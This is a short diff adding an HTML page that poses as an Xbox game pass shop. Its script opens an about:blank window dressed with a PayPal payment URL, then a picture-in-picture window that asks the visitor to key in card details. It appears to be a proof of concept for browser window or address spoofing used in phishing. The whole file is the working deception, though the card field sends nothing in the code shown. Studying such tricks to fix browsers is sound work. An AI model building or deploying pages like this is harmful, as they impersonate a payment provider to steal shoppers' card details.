@@ -1,0 +1,10 @@
+<h1>Buy Xbox game passes</h1>
+<button id="pipButton">Make payment.</button>
+
+<script>
+pipButton.addEventListener("click", async () => {
+  const player = document.querySelector("#player");
+  const w = window.open("about:blank#https://paypal.com/payment/a2ef-05f3-41356e")
+  w.document.write("<button onclick=\"documentPictureInPicture.requestWindow().then(w => w.document.write('Key in your card details: <input></input>'))\">Click to proceed to payment</button>")
+});
+</script>
